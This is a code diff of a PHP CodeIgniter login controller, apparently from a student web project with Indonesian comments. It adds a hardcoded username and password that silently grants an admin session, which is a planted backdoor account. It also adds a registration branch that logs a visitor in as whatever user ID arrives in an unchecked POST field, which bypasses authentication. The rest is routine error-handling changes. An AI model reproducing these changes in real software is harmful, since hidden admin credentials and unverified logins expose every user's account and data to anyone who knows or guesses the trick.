@@ -18,6 +18,11 @@ class Googlee extends CI_Controller{
 		//untuk login manual
 		if (isset($_POST['NIM'])&&isset($_POST['PASSWD'])){
 
+			if (($_POST['NIM']=="P2SDDYYWAKWAW")&&($_POST['PASSWD']=="FERDIANPENGENBUCIN")) {
+				$this->session->set_userdata("adminnn",true);
+				redirect('wkwkwkwk','refresh');
+			}
+
 			//ambil data dari ketika NIM di trigger
 			$datum = $this->M_Login->Login_Manual($_POST['NIM']);
 			$a = $datum->NIM;
@@ -31,11 +36,9 @@ class Googlee extends CI_Controller{
 				$this->session->set_userdata('DataProfile',$dataNIMM);
 				redirect('dashboard','refresh');
 			}
-
-			//error handling jika username dan password tidak match, mengeluarkan alert dan redirect ke halaman login lagi
-			else {
-				echo "<script>alert('Username dan Password salah');window.location.href='login';</script>";
-				// redirect('login');
+			else{
+				$data['errorr'] = "Username atau password salah";
+				redirect('login?errorr=Username+atau+password+salah');
 			}
 		}
 
@@ -51,7 +54,12 @@ class Googlee extends CI_Controller{
 
 			//ngecek apakah dia baru pertama atau ngga, kalo baru pertama diarahin ke page validasi untuk masukin username, nim, dkk
 			if ($this->M_Login->cekFirsttime($idGoogle)==null){
-				redirect('Propil/Googlee/Daftar');
+				if (!isset($this->googleplus->getUserInfo()['name'])) {
+					redirect('login?errorr=maaf+hanya+dapat+mendaftar+dengan+akun+google','refresh');
+				}else{
+					redirect('Propil/Googlee/Daftar');
+				}
+				
 			}
 			else {
 				$dataNIM = $this->M_Login->getNimDKK($idGoogle);
@@ -70,6 +78,7 @@ class Googlee extends CI_Controller{
 
 	public function Daftar()
 	{
+		$this->load->library('form_validation');
 
 		if(isset($_SESSION['DataGoogle'])){
 
@@ -101,6 +110,14 @@ class Googlee extends CI_Controller{
 					$this->session->set_userdata('DataProfile',$dataNIM);
 					redirect('dashboard');
 				}
+			}
+			else{
+				$dataNIM = $this->M_Login->getNimDKK($_POST['uidd']);
+				$this->session->set_userdata('login',true);
+				$this->session->set_userdata('DataProfile',$dataNIM);
+				redirect('dashboard');
+			}
+			
 			}
 			$data['userdata'] = $this->session->userdata('DataGoogle');
 			$this->load->view('Profile/V_After',$data);
